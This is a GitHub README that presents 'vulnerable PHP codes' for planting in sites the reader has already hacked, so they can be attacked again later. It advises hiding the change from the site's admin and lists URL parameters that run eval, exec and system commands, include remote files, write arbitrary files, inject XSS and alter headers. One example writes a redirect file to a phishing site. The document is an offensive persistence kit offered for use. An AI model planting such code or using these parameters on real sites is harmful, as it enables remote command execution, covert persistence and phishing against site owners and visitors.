<div align="center">

# PHP Vulnerable code 

[![Coded By](https://img.shields.io/badge/Coded%20By-Zech%20Bron-red?style=for-the-badge&logo=github)](https://github.com/ZechBron)


</div>

### Description:

This is a Vulnerable PHP Codes to put inside a file (but do not modify that file to avoid the admin discovering what you've done) for future attack.
Note that the only purpose of this code is to insert this shit in a file to make the site vulnerable for your future attack.

Note that this is not a shell or backdoor. This is just a vulnerable php codes that you can insert to the site you have hacked to make the sites vulnerable for future attack.

__Disadvatage__

Other hackers might find and exploit this but if you want though you can put this vulnerable code in a seperate file and just put a password so only you can access this.


### Queries and Parameters

+ XSS

   .php?xzz=//your xss parameter here

+ Eval

   .php?zeval=//command here

+ Exec

   .php?zexec=//command here

+ System

   .php?zsys=//command here

   `Note: You don't have to type system() here. Just type the commands and that's all. For Example: .php?zsys=uname%20-a

+ File Inclusions

   .php?zfile=//remote or local file here

+ Create and Write a File

   .php?zfilename=filename-of-your-choice&&zcontent=file-content

   ```
   Example:
   I want to write a php file in a site but that site has no shell yet.
   The filename I want is redir.php and the content I want is this: <?php header("LOcation: " . "https://my-phishing-sites.com");

   So I will put these in the address bar:

   .php?zfilename=redir.php&&zcontent=<?php header("Location: " . "https://my-phishing-site.com");


   Everything depends on you.

+ Header Hacking and Manipulating

   .php?zheader=//Your Header Content Here
